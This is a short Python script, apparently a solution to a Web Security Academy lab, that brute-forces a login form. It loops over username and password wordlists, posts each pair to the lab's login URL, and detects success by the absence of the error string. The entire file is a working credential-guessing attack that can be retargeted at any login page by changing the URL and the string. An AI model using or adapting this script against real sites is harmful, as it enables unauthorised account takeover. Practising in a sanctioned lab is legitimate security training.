import requests 

url = "https://0a6d00800346df68812693900080003f.web-security-academy.net/login"
userList = "testuser"
passList = "testpass"
grep = "Invalid username or password."
flag = 0

with open(userList , 'r') as usernames:
    for username in usernames:
        with open(passList , 'r') as passwords:
            for password in passwords:
                username = username.strip('\n')
                password = password.strip('\n')
                data={'username' : username ,'password':password}
                response = requests.post(url,data,allow_redirects = False)
                if grep in response.text:
                    print(f"Wrong Login with 'username' = {username} and 'password' = {password}")
                    continue
                else:
                    print(f"Login with 'username' = {username} and 'password' = {password}.")
                    flag = 1
                    break
if flag != 1:
    print("Not Found in The lists")

